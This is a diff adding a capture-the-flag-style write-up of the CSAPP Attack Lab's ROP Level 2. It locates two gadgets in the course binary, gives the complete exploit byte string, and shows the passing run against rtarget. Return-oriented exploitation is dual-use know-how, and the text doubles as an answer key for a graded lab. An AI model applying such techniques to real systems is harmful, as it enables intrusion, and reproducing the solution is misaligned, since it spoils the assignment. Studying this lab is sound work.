@@ -356,5 +356,32 @@ ret // jump to the second gadget
 movq	%rax, %rdi // move cookie value to rdi
 ret // jump to touch 2
 ```
+By searching the `table 1`, we can find that `popq %rax` can be represented as `58` and `ret` can be represented as `c3`. Thus the first gadget can be represented as `58 90 c3` or `58 c3`, where `90` represented by `nop(no operation)`, which is doing nothing but increment program counter by 1. Specifically, we found that `getval_280` and `addval_219` contain such gadget.
+
+We choose function `getval_280` as our first gadget
+
+```asm
+00000000004019ca <getval_280>:  4019ca:	b8 29 58 90 c3       	mov    $0xc3905829,%eax  4019cf:	c3                   	retq 
+```
+**As we can see in the code, the first address of gadget should be `0x4019ca+0x2 = 0x4019cc`**
+
+For the second gadget, we can see that `movq %rax, %rdi; ret` should be represent as `48 89 c7 c3`, we can find this gadget from the function `addval_273`, where its first address should be `0x4019a0 + 0x2 = 0x4019a2`.
+
+```asm
+00000000004019a0 <addval_273>:  4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax  4019a6:	c3                   	retq    
+```
+Thus the exploit string should be like this:
+
+```
+00 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 00cc 19 40 00 00 00 00 00		<- The address for the first gadgetfa 97 b9 59 00 00 00 00		<- Cookie Valuea2 19 40 00 00 00 00 00		<- The address for the second gadgetec 17 40 00 00 00 00 00		<- The address of touch2()
+```
+
+We pass the test: 
+
+```bash
+➜  ~/cmu-15-213-CSAPP3E-lab/3.Attack_lab/target1 ./hex2raw < solutions/RoP_Level2/ROP_Level2.txt | ./rtarget -qCookie: 0x59b997faType string:Touch2!: You called touch2(0x59b997fa)Valid solution for level 2 with target rtargetPASS: Would have posted the following:	user id	bovik	course	15213-f15	lab	attacklab	result	1:PASS:0xffffffff:rtarget:2:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+	00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 CC 19 40 00 00 00 00 00 FA 97 B9 59 
+	00 00 00 00 A2 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00
+```
 
 ###  2.2 Level 3
